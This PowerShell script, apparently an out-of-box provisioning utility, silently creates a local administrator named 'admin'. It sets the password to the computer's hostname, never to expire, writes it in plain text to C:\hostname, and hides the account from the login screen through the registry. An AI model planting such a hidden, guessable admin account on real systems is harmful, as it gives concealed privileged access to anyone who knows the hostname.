param(
  [switch]$v
)

$ErrorActionPreference = 'Stop'
$User = 'admin'
$Pass = $env:COMPUTERNAME
$HostFile = 'C:\hostname'
$UserListKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'

# Ensure C:\hostname written
try { Set-Content -Path $HostFile -Value $Pass -Encoding ASCII -Force } catch {}

function Add-Admin {
  try { Import-Module Microsoft.PowerShell.LocalAccounts -ErrorAction SilentlyContinue } catch {}
  $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
  $u = Get-LocalUser -Name $User -ErrorAction SilentlyContinue
  if (-not $u) {
    New-LocalUser -Name $User -Password $sec -PasswordNeverExpires | Out-Null
  } else {
    Set-LocalUser -Name $User -Password $sec
    Set-LocalUser -Name $User -PasswordNeverExpires $true
  }
  Set-LocalUser -Name $User -FullName ''
  Enable-LocalUser -Name $User
  Add-LocalGroupMember -Group 'Administrators' -Member $User -ErrorAction SilentlyContinue

  # Hide from login screen
  if (-not (Test-Path $UserListKey)) { New-Item $UserListKey -Force | Out-Null }
  New-ItemProperty -Path $UserListKey -Name $User -Value 0 -PropertyType DWord -Force | Out-Null
}

function Remove-Admin {
  try { Import-Module Microsoft.PowerShell.LocalAccounts -ErrorAction SilentlyContinue } catch {}
  $u = Get-LocalUser -Name $User -ErrorAction SilentlyContinue
  if ($u) {
    $sid = ([System.Security.Principal.NTAccount]$User).Translate([System.Security.Principal.SecurityIdentifier]).Value
    Remove-LocalUser -Name $User
    # Profile folder and registry cleanup
    $profKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid"
    $p = (Get-ItemProperty -Path $profKey -Name ProfileImagePath -ErrorAction SilentlyContinue).ProfileImagePath
    if ($p) {
      $p = [Environment]::ExpandEnvironmentVariables($p)
      if (Test-Path $p) { attrib -r -s -h $p -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue }
    }
    if (Test-Path $profKey) { Remove-Item -Path $profKey -Recurse -Force -ErrorAction SilentlyContinue }
  }
  # Unhide entry if present
  if (Test-Path $UserListKey) { Remove-ItemProperty -Path $UserListKey -Name $User -ErrorAction SilentlyContinue }
}

if ($v) {
  Write-Host "=============================="
  Write-Host " OOBE Admin Utility (Verbose)"
  Write-Host "=============================="
  Write-Host "Hostname / Password: $Pass`n"
  Write-Host "[1] Add admin account (hidden on login screen)"
  Write-Host "[2] Remove admin account (with profile)"
  $choice = Read-Host "Select 1 or 2"
  switch ($choice) {
    '1' { Add-Admin; Write-Host "= 1" }
    '2' { Remove-Admin; Write-Host "= 1" }
    default { throw "Invalid choice" }
  }
} else {
  Add-Admin
  Write-Output "= 1"
}
